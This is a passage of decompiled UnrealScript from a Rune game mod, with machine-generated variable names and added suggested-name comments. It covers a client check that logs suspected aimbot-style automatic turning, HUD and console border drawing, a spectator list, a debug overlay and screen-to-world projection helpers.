		if (Viewport.Actor.IsInState('PlayerWalking') && !Viewport.Actor.FootRegion.Zone.bWaterZone && YawTest == 100000 && Decoration(ZRunePlayer(Viewport.Actor).A_v4611) == none && Pawn(ZRunePlayer(Viewport.Actor).A_v4611) == none && !ZRunePlayer(Viewport.Actor).A_v4611.bIsMover && ZRunePlayer(Viewport.Actor).AnimSequence != 'crouch_idle' && ZRunePlayer(Viewport.Actor).AnimSequence != 'neutral_kick')
		{
			if (INT_v6719 > 0)
			{
				INT_v6719--;
			}
			if (B_v6718)
			{
				UNK_v6716 = PlayerRotation;
				B_v6718 = false;
			}
			if (!B_v6718 && INT_v6719 <= 0)
			{
				if (PlayerRotation != Normalize(UNK_v6716) && B_v6717 && !Viewport.Actor.bIsTyping)
				{
					INT_v6722++;
					UNK_v6716 = PlayerRotation;
				}
				if (INT_v6722 > 5 && !Viewport.Actor.bIsTyping)
				{
					ZRunePlayer(Viewport.Actor).USELESSSTUCT.UNK_v4553 = true;
					ZRunePlayer(Viewport.Actor).USELESSSTUCT.UNK_v4584 = true;
					if (bSwapInput || bSwap)
					{
						// Suggested name: LogCheatDetection
						ZRunePlayer(Viewport.Actor).LogCheatDetection("using automatic turning. (keybinds or aimbot ) | ", 1);
					}
					else
					{
						// Suggested name: LogCheatDetection
						ZRunePlayer(Viewport.Actor).LogCheatDetection("using automatic turning. (keybinds or aimbot )", 1);
					}
				}
				if (B_v6717 && INT_v6719 <= 0)
				{
					Viewport.Actor.aMouseX = 0.0;
					Viewport.Actor.ViewRotation.Yaw = UNK_v6716.Yaw;
				}
			}
		}
		else
		{
			INT_v6719 = 300;
			INT_v6722 = 0;
			if (YawTest != 100000)
			{
				Viewport.Actor.ViewRotation.Yaw = YawTest;
				UNK_v6716.Yaw = YawTest;
				YawTest = 100000;
			}
			else
			{
				UNK_v6716 = PlayerRotation;
			}
		}
	}
	else
	{
		INT_v6719 = 300;
	}

	// Render UI based on mode
	if (INT_v6715 == 1)
	{
		RenderUWindowInterface(Canvas);
	}
	else
	{
		if (bNoDrawWorld)
		{
			Canvas.SetPos(0.0, 0.0);
			Canvas.DrawPattern(Texture'Engine.Border', Canvas.ClipX, Canvas.ClipY, 1.0);
		}
		if (bTimeDemo)
		{
			TimeDemoCalc();
			TimeDemoRender(Canvas);
		}
		if (ConsoleLines > 0)
		{
			Canvas.SetOrigin(0.0, float(ConsoleLines) - (FrameY * 0.6));
			Canvas.SetPos(0.0, 0.0);
			Canvas.DrawTile(ConBackground, FrameX, FrameY * 0.6, Canvas.CurX, Canvas.CurY, FrameX, FrameY);
		}
		if (BorderLines > 0 || BorderPixels > 0)
		{
			BorderHeight = BorderLines + ConsoleLines;
			BorderWidth = int(FrameY - float(BorderLines));
			if (INT_v6359 == 0)
			{
				if (BorderLines > 0)
				{
					Canvas.SetOrigin(0.0, 0.0);
					Canvas.SetPos(0.0, 0.0);
					Canvas.DrawPattern(Texture'worldflags.BG', FrameX, float(BorderLines), 1.0);
					Canvas.SetPos(0.0, float(BorderWidth));
					Canvas.DrawPattern(Texture'worldflags.BG', FrameX, float(BorderLines), 1.0);
				}
				if (BorderPixels > 0)
				{
					Canvas.SetOrigin(0.0, 0.0);
					Canvas.SetPos(0.0, float(BorderHeight));
					Canvas.DrawPattern(Texture'worldflags.BG', float(BorderPixels), float(BorderWidth - BorderHeight), 1.0);
					Canvas.SetPos(FrameX - float(BorderPixels), float(BorderHeight));
					Canvas.DrawPattern(Texture'worldflags.BG', float(BorderPixels), float(BorderWidth - BorderHeight), 1.0);
				}
			}
			if (INT_v6359 == 1)
			{
				// Empty for mode 1
			}
			if (INT_v6359 == 2)
			{
				if (BorderLines > 0)
				{
					Canvas.SetOrigin(0.0, 0.0);
					Canvas.SetPos(0.0, 0.0);
					Canvas.DrawPattern(Texture'worldflags.BG', FrameX, float(BorderLines), 1.0);
					Canvas.SetPos(0.0, float(BorderWidth));
					Canvas.DrawPattern(Border, FrameX, float(BorderLines), 1.0);
				}
				if (BorderPixels > 0)
				{
					Canvas.SetOrigin(0.0, 0.0);
					Canvas.SetPos(0.0, float(BorderHeight));
					Canvas.DrawPattern(Border, float(BorderPixels), float(BorderWidth - BorderHeight), 1.0);
					Canvas.SetPos(FrameX - float(BorderPixels), float(BorderHeight));
					Canvas.DrawPattern(Texture'worldflags.BG', float(BorderPixels), float(BorderWidth - BorderHeight), 1.0);
				}
			}
		}
		Canvas.SetOrigin(0.0, 0.0);
		if (ConsoleLines > 0)
		{
			DrawConsoleView(Canvas);
		}
		else
		{
			DrawSingleView(Canvas);
		}
	}

	// Draw spectator list
	if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo) != none)
	{
		if (!Owner.IsInState('PlayerSpectating') && !spec)
		{
			if (Viewport.Actor.bShowScores || Canvas.ClipX > 1000.0)
			{
				DrawSpectatorList(Canvas, true);
			}
		}
		else
		{
			DrawSpectatorList(Canvas, false);
		}
	}

	// Store zone info
	ZI_v6688 = Owner.Region.Zone;
	Owner.bDelayedCommand = false;
}
// Suggested name: DrawSpectatorList
function DrawSpectatorList(Canvas Canvas, bool Player)
{
	local zPlayerReplicationInfo PlayerRep;
	local int SpectatorIndex;
	local string SpectatorName;
	local float DrawY, BaseY, LineHeight;
	local bool IsNestedSpectator;

	Canvas.Font = Canvas.BigFont;
	Canvas.DrawColor = MakeColor(30, 144, byte(255));
	BaseY = Canvas.ClipY * 0.4000000;
	LineHeight = 30.0000000;
	SpectatorIndex = 0;

	if ((Owner.Health > 0) && !spec)
	{
		foreach Owner.Level.AllActors(Class'coadminz7.zPlayerReplicationInfo', PlayerRep)
		{
			if (PlayerRep.PP_v5410 == Owner)
			{
				SpectatorIndex++;
				DrawY = BaseY + (float(SpectatorIndex) * LineHeight);
				DrawTextWithBackground(Canvas, PlayerRep.PlayerName, int(Canvas.ClipX), int(DrawY), 0.6500000, MakeColor(0, 0, 0), GetTeamColor(int(PlayerRep.Team), PlayerRep), 5, 24, true);
			}
			if ((((PlayerRep.PP_v5410 != none) && zPlayerReplicationInfo(PlayerRep.PP_v5410.PlayerReplicationInfo).PP_v5410 != none) && zPlayerReplicationInfo(PlayerRep.PP_v5410.PlayerReplicationInfo).PP_v5410 == Owner) && PlayerRep.PP_v5410 != Owner)
			{
				SpectatorIndex++;
				DrawY = BaseY + (float(SpectatorIndex) * LineHeight);
				DrawTextWithBackground(Canvas, "~ " $ PlayerRep.PlayerName, int(Canvas.ClipX), int(DrawY), 0.6500000, MakeColor(0, 0, 0), GetTeamColor(int(PlayerRep.Team), PlayerRep), 5, 24, true);
			}
		}
	}
	else
	{
		if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).PP_v5410 == none)
		{
			return;
		}
		foreach Owner.Level.AllActors(Class'coadminz7.zPlayerReplicationInfo', PlayerRep)
		{
			if ((PlayerRep.PP_v5410 != none) && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).PP_v5410 == PlayerRep.PP_v5410)
			{
				SpectatorIndex++;
				DrawY = BaseY + (float(SpectatorIndex) * LineHeight);
				if (((zPlayerReplicationInfo(Owner.PlayerReplicationInfo).PP_v5410 != none) && zPlayerReplicationInfo(PlayerRep.PP_v5410.PlayerReplicationInfo).PP_v5410 != none) && zPlayerReplicationInfo(PlayerRep.PP_v5410.PlayerReplicationInfo).PP_v5410 == zPlayerReplicationInfo(Owner.PlayerReplicationInfo).PP_v5410)
				{
					IsNestedSpectator = true;
				}
				if ((((PlayerRep != none) && PlayerRep.PP_v5410 != none) && PlayerRep.PP_v5410.PlayerReplicationInfo != none) && IsNestedSpectator)
				{
					if ((PlayerRep.PP_v5410 != none) && PlayerRep.PP_v5410 != zPlayerReplicationInfo(Owner.PlayerReplicationInfo).PP_v5410)
					{
						SpectatorName = "~" @ PlayerRep.PlayerName;
					}
					else
					{
						SpectatorName = PlayerRep.PlayerName;
					}
				}
				else
				{
					SpectatorName = PlayerRep.PlayerName;
				}
				if ((PlayerRep != none) && SpectatorName != "")
				{
					DrawTextWithBackground(Canvas, SpectatorName, int(Canvas.ClipX), int(DrawY), 0.8000000, MakeColor(0, 0, 0), GetTeamColor(int(PlayerRep.Team), PlayerRep), 5, 24, true);
				}
			}
		}
	}
	return;
}

// Suggested name: GetTeamColorBySwitch
function Color GetTeamColor(int Team, zPlayerReplicationInfo PlayerInfo)
{
    // This function returns a color based on the team number and a boolean flag (PlayerInfo.bswitchcolors).

    if (PlayerInfo.bswitchcolors)
    {
        switch (Team)
        {
            case 0: return MakeColor(240, 52, 52); // Red
            case 1: return MakeColor(72, 243, 89); // Green
            default: return MakeColor(255, 255, 255); // White
        }
    }
    else
    {
        switch (Team)
        {
            case 0: return MakeColor(240, 52, 52); // Red
            case 1: return MakeColor(32, 160, 230); // Blue
            default: return MakeColor(255, 255, 255); // White
        }
    }
}

// Suggested name: DrawTextWithBackground
function DrawTextWithBackground(Canvas Canvas, string Text, int X, int Y, float Alpha, Color BackgroundColor, Color TextColor, int Padding, int Offset, optional bool bRightAlign)
{
    // This function draws text with a background on the canvas.

    local float TextWidth, TextHeight;

    Canvas.bCenter = false;
    Canvas.DrawColor = BackgroundColor;
    Canvas.Style = 5;
    Canvas.AlphaScale = Alpha;
    Canvas.StrLen(Text, TextWidth, TextHeight);

    if (!bRightAlign)
    {
        Canvas.SetPos(float(X - Padding), float(Y - Padding));
    }
    else
    {
        Canvas.SetPos(((float(X) - TextWidth) - float(Padding)) - float(Offset), float(Y - (Padding / 2)));
    }

    Canvas.DrawTile(Background, (TextWidth + float(Padding)) + float(Offset), TextHeight + float(Padding), 0.0, 0.0, float(Background.USize), float(Background.VSize));

    Canvas.Style = 1;
    Canvas.AlphaScale = 1.0;
    Canvas.DrawColor = TextColor;

    if (!bRightAlign)
    {
        Canvas.DrawText(Text);
    }
    else
    {
        DrawRightAlignedText(Canvas, Text, X, Y, Offset);
    }
}
// Suggested name: GetPhysicsModeString
function string GetPhysicsModeString()
{
	// This function returns a string representation of the owner's current physics mode.
	local string Text;

	switch(Owner.Physics)
	{
		case PHYS_None:
			Text = "PHYS_None";
			break;
		case PHYS_Walking:
			Text = "PHYS_Walking";
			break;
		case PHYS_Falling:
			Text = "PHYS_Falling";
			break;
		case PHYS_Swimming:
			Text = "PHYS_Swimming";
			break;
		case PHYS_Flying:
			Text = "PHYS_Flying";
			break;
		case PHYS_Rotating:
			Text = "PHYS_Rotating";
			break;
		case PHYS_Projectile:
			Text = "PHYS_Projectile";
			break;
		case PHYS_Rolling:
			Text = "PHYS_Rolling";
			break;
		case PHYS_Interpolating:
			Text = "PHYS_Interpolating";
			break;
		case PHYS_MovingBrush:
			Text = "PHYS_MovingBrush";
			break;
		case PHYS_Spider:
			Text = "PHYS_Spider";
			break;
		case PHYS_Trailer:
			Text = "PHYS_Trailer";
			break;
		case PHYS_Sliding:
			Text = "PHYS_Sliding";
			break;
		default:
			Text = ("UNKNOWN (" $ string(Owner.Physics)) $ ")";
			break;
	}
	return Text;
}

// Draws debug information overlay on the canvas based on the current CAZDebugMode.
// This function displays various player and game state information for debugging purposes.
function DrawCAZDebugInfo(Canvas Canvas)
{
	local Vector ScreenToWorldPosition; // Position converted from screen to world coordinates
	local int Index; // Loop index for iterating through history or other arrays
	local Vector CameraLocation; // Calculated camera location for behind view
	local Rotator CameraRotation; // Calculated camera rotation for behind view

	// Set initial drawing position for debug text (75% across the screen width, starting at Y=65)
	DebugTextX = int(Canvas.ClipX * 0.75);
	DebugTextY = 65;
	Canvas.DrawColor = MakeColor(180, 230, 230); // Light cyan color for text
	Canvas.Style = 2; // Translucent style
	Canvas.bCenter = false;
	Canvas.Font = Canvas.BigFont;
	DrawDebugText("~ CAZ Debug ~", Canvas); // Draw header
	Canvas.Font = Canvas.MedFont;
	DrawDebugText("_____________________________________", Canvas, 9); // Separator line
	DrawDebugText("", Canvas, 9); // Empty line for spacing
	Canvas.Font = Canvas.MedFont;

	// If in spectator mode, show spectator-specific debug info
	if (spec)
	{
		DrawDebugText("Spectator Target: " $ string(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).PP_v5410), Canvas);
		DrawDebugText("Spectator Target's Target: " $ string(zPlayerReplicationInfo(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).PP_v5410.PlayerReplicationInfo).PP_v5410), Canvas);
		return; // Exit early for spectator mode
	}

	// Debug Mode 1: Movement and physics information
	if (CAZDebugMode == 1)
	{
		DrawDebugText("Acceleration: " $ string(Owner.Acceleration), Canvas);
		DrawDebugText("Velocity: " $ string(Owner.Velocity), Canvas);
		DrawDebugText("_____________________________________", Canvas, 9);
		DrawDebugText("Ground Speed: " $ string(ZRunePlayer(Owner).GroundSpeed), Canvas);
		DrawDebugText("Combat Speed: " $ string(ZRunePlayer(Owner).CombatSpeed), Canvas);
		DrawDebugText("Air Speed: " $ string(ZRunePlayer(Owner).AirSpeed), Canvas);
		DrawDebugText("_____________________________________", Canvas, 9);
		DrawDebugText("Player State: " $ string(Owner.GetStateName()), Canvas);
		if (Owner.GetStateName() == 'PlayerSwimming')
		{
			DrawDebugText("+ Surface Swimming: " $ string(ZRunePlayer(Owner).bSurfaceSwimming), Canvas);
		}
		DrawDebugText("Physics Mode: " $ GetPhysicsModeString(), Canvas);
		DrawDebugText("_____________________________________", Canvas, 9);
		DrawDebugText((((("Region: " $ string(Owner.Region.Zone)) @ "~") @ string(Owner.Region.iLeaf)) @ "~") @ string(Owner.Region.ZoneNumber), Canvas);
		DrawDebugText("Base Actor: " $ string(Owner.Base), Canvas);
		DrawDebugText("Location: " $ string(Owner.Location), Canvas);
		Owner.CalcBehindView(CameraLocation, CameraRotation, float(testint2)); // Calculate behind-view camera position
		DrawDebugText("Saved Camera Location: " $ string(RunePlayer(Owner).SavedCameraLoc), Canvas);
		DrawDebugText(("Calculated Location: " $ string(testint1)) @ string(CameraLocation), Canvas);
		DrawDebugText("View Location: " $ string(Owner.ViewLocation), Canvas);
		DrawDebugText("Rotation: " $ string(Owner.Rotation), Canvas);
	}

	// Debug Mode 2: View and rotation information
	if (CAZDebugMode == 2)
	{
		DrawDebugText("View Rotation: " $ string(Owner.ViewRotation), Canvas);
		DrawDebugText("Rotation Rate: " $ string(Owner.RotationRate), Canvas);
		DrawDebugText("Weapon Out Distance: " $ string(INT_v6372), Canvas);
		DrawDebugText("View Vector: " $ string(VCT_v6373), Canvas);
		DrawDebugText("View Target 1: " $ STR_v6374, Canvas);
		DrawDebugText("View Target 2: " $ STR_v6375, Canvas);
		DrawDebugText("Actor 1: " $ string(A_v6370), Canvas);
		DrawDebugText("Actor 2: " $ string(A_v6371), Canvas);
		DrawDebugText("End Point: " $ string(VCT_v6376), Canvas);
	}

	// Debug Mode 3: Animation information (basic)
	if (CAZDebugMode == 3)
	{
		DrawDebugText((("Animation Sequence: " $ string(Owner.AnimSequence)) @ "  ") @ string(ZRunePlayer(Owner).GetGroup(ZRunePlayer(Owner).AnimSequence)), Canvas);
		DrawDebugText(("Proxy Sequence: " $ STR_v6732) @ string(zPlayerProxy(ZRunePlayer(Owner).AnimProxy).AnimSequence), Canvas);
		DrawDebugText("Animation Frame: " $ string(Owner.AnimFrame), Canvas);
		DrawDebugText(("Animation Rate: " $ string(Owner.AnimRate)) $ string(INT_v6357), Canvas);
		DrawDebugText("Client Animation: " $ string(Owner.bClientAnim), Canvas);
	}

	// Debug Mode 4: Animation information (detailed)
	if (CAZDebugMode == 4)
	{
		DrawDebugText((("Animation Sequence: " $ string(Owner.AnimSequence)) @ "  ") @ string(ZRunePlayer(Owner).GetGroup(ZRunePlayer(Owner).AnimSequence)), Canvas);
		DrawDebugText(("Proxy Sequence: " $ STR_v6732) @ string(zPlayerProxy(ZRunePlayer(Owner).AnimProxy).AnimSequence), Canvas);
		DrawDebugText("Animation Frame: " $ string(Owner.AnimFrame), Canvas);
		DrawDebugText(("Animation Rate: " $ string(Owner.AnimRate)) $ string(INT_v6357), Canvas);
		DrawDebugText("Client Animation: " $ string(Owner.bClientAnim), Canvas);
		DrawDebugText((("Player Move / Moving / Animation End: " $ string(INT_v6346)) @ string(INT_v6347)) @ string(INT_v6348), Canvas);
		DrawDebugText((("Simulated Animation Frame:  " @ string(Owner.SimAnim.X * 0.0001)) $ "/") $ string(Owner.AnimFrame), Canvas);
		DrawDebugText((("Simulated Animation Rate:   " @ string(Owner.SimAnim.Y * 0.0002)) $ "/") $ string(Owner.AnimRate), Canvas);
		DrawDebugText((("Simulated Tween Rate:  " @ string(Owner.SimAnim.Z * 0.001)) $ "/") $ string(Owner.TweenRate), Canvas);
		DrawDebugText((("Simulated Animation Last:   " @ string(Owner.SimAnim.W * 0.0001)) $ "/") $ string(Owner.AnimLast), Canvas);
		DrawDebugText(((("Simulated Anim Vector: " $ string(Owner.SimAnim.X)) @ string(Owner.SimAnim.Y)) @ string(Owner.SimAnim.Z)) @ string(Owner.SimAnim.W), Canvas);
		DrawDebugText("Old Animation Rate: " $ string(Owner.OldAnimRate), Canvas);
		DrawDebugText(("Animation Last / Min Rate: " $ string(Owner.AnimLast)) @ string(Owner.AnimMinRate), Canvas);
	}

	// Debug Mode 5: UI and miscellaneous information
	if (CAZDebugMode == 5)
	{
		DrawDebugText("Category ID: " $ string(gI), Canvas);
		DrawDebugText("Menu ID: " $ string(INT_v6448), Canvas);
		DrawDebugText("GUI Scale: " $ string(Root.GUIScale), Canvas);
		DrawDebugText("Test String Length: " $ string(Len(STR_v6368)), Canvas);
		DrawDebugText("Test Integer: " $ string(INT_v6369), Canvas);
		if (zPlayerReplicationInfo(Owner.PlayerReplicationInfo).PP_v5410 != none)
		{
			DrawDebugText("Spectator Target: " $ string(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).PP_v5410), Canvas);
		}
		if (spec)
		{
			DrawDebugText("Spectator Target's Target: " $ string(zPlayerReplicationInfo(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).PP_v5410.PlayerReplicationInfo).PP_v5410), Canvas);
		}
		if (ZRunePlayer(Owner) != none)
		{
			DrawDebugText("Behind View FOV: " $ string(ZRunePlayer(Owner).FLT_v4707), Canvas);
			DrawDebugText("Desired FOV: " $ string(ZRunePlayer(Owner).DesiredFOV), Canvas);
			DrawDebugText("Default FOV: " $ string(ZRunePlayer(Owner).DefaultFOV), Canvas);
			DrawDebugText("Player FOV: " $ string(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Parm_float_0), Canvas);
			if (zArenaHUD(ZRunePlayer(Owner).myHUD) != none)
			{
				DrawDebugText(("HUD Health Fade: " $ string(zArenaHUD(ZRunePlayer(Owner).myHUD).FadeHealth)) @ string(zArenaHUD(ZRunePlayer(Owner).myHUD).HudHealth), Canvas);
			}
			if (ZRunePlayer(Owner).ViewTarget != none)
			{
				DrawDebugText("View Target: " $ string(ZRunePlayer(Owner).ViewTarget), Canvas);
				if (ZRunePlayer(Owner).IsInState('PlayerSpectating'))
				{
					DrawDebugText("View Target Health: " $ string(Pawn(ZRunePlayer(Owner).ViewTarget).Health), Canvas);
					DrawDebugText(("HUD Fade Health: " $ string(zArenaHUD(ZRunePlayer(Owner).myHUD).FadeHealth)) @ string(zArenaHUD(ZRunePlayer(Owner).myHUD).HudHealth), Canvas);
				}
			}
		}
		DrawDebugText("Cursor X: " $ string(INT_v6451 - 20), Canvas);
		DrawDebugText("Cursor Y: " $ string((INT_v6450 - 23) - catY), Canvas);
		DrawDebugText("Category Width: " $ string(categoryWidth), Canvas);
		DrawDebugText("Category Height: " $ string(categoryHeight), Canvas);
		DrawDebugText("Idle Time: " $ string(int(Viewport.Actor.Level.TimeSeconds - float(INT_v6742))), Canvas);
		DrawDebugText("Total Idle Time: " $ string(INT_v6745), Canvas);
		DrawDebugText("Saved Idle Time: " $ string(savedIdleTime), Canvas);
		DrawDebugText("Hash Debug: " $ hashDe, Canvas);
		DrawDebugText((("Canvas Clip X/Y: " $ string(Canvas.ClipX)) @ "/") @ string(Canvas.ClipY), Canvas);
		DrawDebugText((("Canvas Origin X/Y: " $ string(Canvas.OrgX)) @ "/") @ string(Canvas.OrgY), Canvas);
		DrawDebugText("Computed GUI Scale: " $ string(CalculateScaleFactor2(Canvas.ClipX, Canvas.ClipY)), Canvas);
		DrawDebugText("Menu Width 1: " $ string(Root.WinWidth), Canvas);
		if (GameMenu != none)
		{
			DrawDebugText("Menu Width 2: " $ string(GameMenu.WinWidth), Canvas);
		}
		if ((zRuneConsoleClientWindow(zRConsoleW.ClientArea) != none) && zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309 != none)
		{
			DrawDebugText("Console Position: " $ string(zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.pos), Canvas);
			DrawDebugText(("Console Min/Max Pos: " $ string(zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MinPos)) @ string(zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxPos), Canvas);
			DrawDebugText("Console Max Visible: " $ string(zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxVisible), Canvas);
		}
		DrawDebugText("Outer Name: " $ string(Outer.Name), Canvas);
		ScreenToWorldPosition = MouseToWorldVector(GetMouseWorldVector(), Canvas); // Convert screen mouse position to world coordinates
		DrawDebugText("Screen to World: " $ string(ScreenToWorldPosition), Canvas);
		DrawDebugText("Screen Scale: " $ string(Tan((Owner.DesiredFOV * 3.141593) / 360) / (Canvas.ClipX / 2)), Canvas);
		if ((A_v6593 != none) && INT_v6715 == 1) // If in menu mode and selected actor exists
		{
			ZRunePlayer(Owner).sMove(0.0, "sctw", A_v6593,, ScreenToWorldPosition.X, ScreenToWorldPosition.Y, ScreenToWorldPosition.Z);
		}
		DrawDebugAxes(Canvas); // Draw 3D debug axes or similar
	}

	// Debug Mode 6: Command history
	if (CAZDebugMode == 6)
	{
		DrawDebugText("History Top: " $ string(HistoryTop), Canvas);
		DrawDebugText("History Bottom: " $ string(HistoryBot), Canvas);
		DrawDebugText("History Current: " $ string(HistoryCur), Canvas);
		DrawDebugText("History Top (Duplicate?): " $ string(HistoryTop), Canvas);
		Index = 0;
		while (Index < 16)
		{
			DrawDebugText((("History[" $ string(Index)) $ "]: ") $ History[Index], Canvas, 0, true); // Right-aligned
			Index++;
		}
	}

	// Debug Mode 7: Timing counters
	if (CAZDebugMode == 7)
	{
		DrawDebugText("Player Tick Count: " $ string(ZRunePlayer(Owner).INT_v4513), Canvas);
		DrawDebugText("Total Tick Count: " $ string(ZRunePlayer(Owner).INT_v4512), Canvas);
		DrawDebugText("Current Cycle Count: " $ string(INT_v6314), Canvas);
		DrawDebugText("Total Cycle Count: " $ string(INT_v6315), Canvas);
	}
	return;
}

// Suggested name: DrawRightAlignedText
function DrawRightAlignedText(Canvas Canvas, string Text, int X, int Y, int Offset)
{
    // This function draws text on the canvas, right-aligned relative to a given X coordinate.

    local float TextWidth, TextHeight;

    Canvas.StrLen(Text, TextWidth, TextHeight);
    Canvas.SetPos(float(X) - (TextWidth + float(Offset)), float(Y));
    Canvas.DrawText(Text);
}
// Draws a line of debug text on the canvas with optional color, alignment, and vertical spacing.
// This function is used for rendering debug information in the game's UI overlay.
function DrawDebugText(string Text, Canvas Canvas, optional int LineSpacing, optional bool RightAlign)
{
	local float TextWidth, TextHeight;

	// Set the draw color based on the line spacing value (used for different text styles)
	if (LineSpacing == 9)
	{
		Canvas.DrawColor = MakeColor(173, 255, 47);  // Light green for special lines
	}
	else
	{
		Canvas.DrawColor = MakeColor(255, 230, 230);  // Light gray for normal lines
	}

	// If right alignment is enabled, calculate text width and position it to the right
	if (RightAlign)
	{
		Canvas.StrLen(Text, TextWidth, TextHeight);
		Canvas.SetPos(float(INT_v6511) - TextWidth, float(INT_v6510));  // Right-align by subtracting width from X position
		Canvas.DrawText(Text);
	}
	else
	{
		// Default left alignment
		Canvas.SetPos(float(INT_v6511), float(INT_v6510));
		Canvas.DrawText(Text);
	}

	// Calculate height of an empty string (likely for spacing consistency)
	Canvas.StrLen("", TextWidth, TextHeight);

	// Increment the Y position for the next line based on spacing or default
	if (LineSpacing != 0)
	{
		INT_v6510 += LineSpacing;
	}
	else
	{
		INT_v6510 += 15;  // Default line height
	}
}

// Suggested name: AdjustCameraPosition
// Adjusts the camera position by pulling it back along the player's view direction.
// This function calculates an offset camera location based on the player's current view rotation and a specified distance.
// The camera is moved backward (opposite to the view direction) by (Distance - 30) units.
function AdjustCameraPosition(out Vector CameraLocation, out Rotator CameraRotation, float Distance)
{
	local Vector ForwardDirection; // The forward direction vector based on the player's view rotation
	local float AdjustedDistance; // The adjusted distance after subtracting a base offset

	// Set the camera rotation to the player's current view rotation
	CameraRotation = RunePlayer(Owner).ViewRotation;
	
	// Set the initial camera location to the player's saved camera location
	CameraLocation = RunePlayer(Owner).SavedCameraLoc;
	
	// Calculate the forward direction vector from the camera rotation
	ForwardDirection = vect(1.0, 0.0, 0.0) >> CameraRotation;
	
	// Compute the adjusted distance (subtracting a base offset of 30 units)
	AdjustedDistance = Distance;
	
	// Offset the camera location backward by the adjusted distance along the forward direction
	CameraLocation -= ((AdjustedDistance - 30.0) * ForwardDirection);
}

// Suggested name: GetMouseWorldVector
function Vector GetMouseWorldVector()
{
    // This function calculates a 3D vector from mouse coordinates and some test floats.

    local Vector MouseVector;

    MouseVector.X = (Root.MouseX * Root.GUIScale) + testfloat5;
    MouseVector.Y = (Root.MouseY * Root.GUIScale) + testfloat6;
    MouseVector.Z = 1.0;

    return MouseVector;
}

// Suggested name: ScreenToWorld
function Vector ScreenToWorld(float ScreenX, float ScreenY, float ViewportWidth, float ViewportHeight)
{
    // This function converts screen coordinates to world coordinates.

    local Vector WorldVector, CameraLocation, WorldDirection;

    WorldVector.X = 1.0 / Tan(((Owner.DesiredFOV / 2.0) / 180.0) * 3.141593);
    WorldVector.Y = (ScreenX - (ViewportWidth / 2.0)) / (ViewportWidth / 2.0);
    WorldVector.Z = -ScreenY - (ViewportHeight / 2.0) / (ViewportWidth / 2.0);
    WorldVector = Normal(WorldVector);

    CameraLocation = RunePlayer(Owner).SavedCameraLoc;
    WorldDirection = CameraLocation + ((WorldVector >> RunePlayer(Owner).SavedCameraRot) * (testfloat7 + 1.0));

    return WorldDirection;
}

// Suggested name: MouseToWorldVector
function Vector MouseToWorldVector(Vector MouseCoordinates, Canvas Canvas)
{
    // This function converts 2D mouse coordinates on the canvas to a 3D world vector.

    return ScreenToWorld(MouseCoordinates.X, MouseCoordinates.Y, Canvas.ClipX, Canvas.ClipY);
}

// Suggested name: WorldToScreenVector
function Vector WorldToScreenVector(Vector WorldVector, Canvas Canvas)
{
    // This function converts a 3D world vector to 2D screen coordinates.

    return WorldToScreenAdvanced(WorldVector, Canvas.ClipX, Canvas.ClipY, Owner.FovAngle, RunePlayer(Owner).SavedCameraLoc, RunePlayer(Owner).SavedCameraRot);
}

// Suggested name: ScreenToWorldAdvanced
function Vector ScreenToWorldAdvanced(Vector ScreenCoords, float ViewportWidth, float ViewportHeight, float FOV, Vector CameraLocation, Rotator CameraRotation)
{
    // This function performs a screen-to-world conversion with more advanced parameters.

    local float HalfViewportWidth, HalfViewportHeight, TanHalfFOV, ScaleFactor;
    local Vector WorldVector, ForwardVector, RightVector, UpVector;

    HalfViewportWidth = ViewportWidth / 2.0;
    HalfViewportHeight = ViewportHeight / 2.0;
    TanHalfFOV = Tan((FOV * 3.141593) / 360.0);
    ScaleFactor = TanHalfFOV / HalfViewportWidth;

    WorldVector.Y = ((ScreenCoords.X - HalfViewportWidth) * ScaleFactor) * testfloat6;
    WorldVector.Z = ((HalfViewportHeight - ScreenCoords.Y) * ScaleFactor) * testfloat5;
    WorldVector.X = 1.0;

    GetAxes(CameraRotation, ForwardVector, RightVector, UpVector);

    WorldVector = ((WorldVector.X * ForwardVector) + (WorldVector.Y * RightVector)) + (WorldVector.Z * UpVector);
    WorldVector = Normal(WorldVector);

    return CameraLocation + (WorldVector / ScaleFactor);
}

// Suggested name: WorldToScreenAdvanced
function Vector WorldToScreenAdvanced(Vector WorldVector, float ViewportWidth, float ViewportHeight, float FOV, Vector CameraLocation, Rotator CameraRotation)
{
    // This function converts a 3D world vector to 2D screen coordinates.

    local float HalfViewportWidth, HalfViewportHeight, TanHalfFOV, ScaleFactor;
    local float DotProductForward, DotProductRight, DotProductUp;
    local Vector ForwardVector, RightVector, UpVector;

    HalfViewportWidth = ViewportWidth / 2.0;
    HalfViewportHeight = ViewportHeight / 2.0;
    TanHalfFOV = Tan((FOV * 3.141593) / 360.0);
    ScaleFactor = TanHalfFOV / HalfViewportWidth;

    GetAxes(CameraRotation, ForwardVector, RightVector, UpVector);

    WorldVector = WorldVector - CameraLocation;

    DotProductForward = (WorldVector Dot ForwardVector) * ScaleFactor;
    DotProductRight = WorldVector Dot RightVector;
    DotProductUp = WorldVector Dot UpVector;

    WorldVector.X = HalfViewportWidth + (DotProductRight / DotProductForward);
    WorldVector.Y = HalfViewportHeight - (DotProductUp / DotProductForward);
    WorldVector.Z = 1.0;

    return WorldVector;
}

// Suggested name: DrawDebugAxes
event DrawDebugAxes(Canvas Canvas)
{
    // This function draws 3D debug axes on the canvas, relative to a selected actor.

    local Vector ScreenMouseVector, WorldMouseVector, Origin, AxisX, AxisY, AxisZ;
    local Actor SelectedActor;
    local Vector ScreenX, ScreenY, ScreenZ;

    if (A_v6593 == none)
    {
        return;
    }

    SelectedActor = A_v6593;

    ScreenMouseVector.X = Canvas.ClipX * 0.05;
    ScreenMouseVector.Y = Canvas.ClipY - (Canvas.ClipX * 0.05);

    WorldMouseVector = MouseToWorldVector(ScreenMouseVector, Canvas);

    Origin = ((WorldMouseVector >> SelectedActor.Rotation) * 10.0) + SelectedActor.Location;
